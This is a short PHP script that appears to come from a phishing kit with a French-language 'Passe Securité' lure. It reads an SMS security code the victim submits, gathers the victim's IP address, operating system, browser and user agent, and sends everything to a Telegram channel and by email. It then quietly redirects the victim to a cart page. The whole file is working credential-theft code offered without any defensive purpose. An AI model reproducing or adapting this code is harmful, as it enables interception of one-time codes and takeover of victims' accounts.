<?php


if(isset($_POST['sms'])){
	
include "../config.php";
include "funcs.php";

$tel =  $_POST['sms'];

$message = "\n🧨SMS: $tel\n🕹️OS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\n🕹️Browser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\n🕹️IP : $ip\n🕹️Agent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);

$subject = "🕹️ Passe Securité |  $ip";

mail($to,$subject,$message);


echo "<meta http-equiv=\"Refresh\" content=\"0; url=../cart.php\" />";



}
?>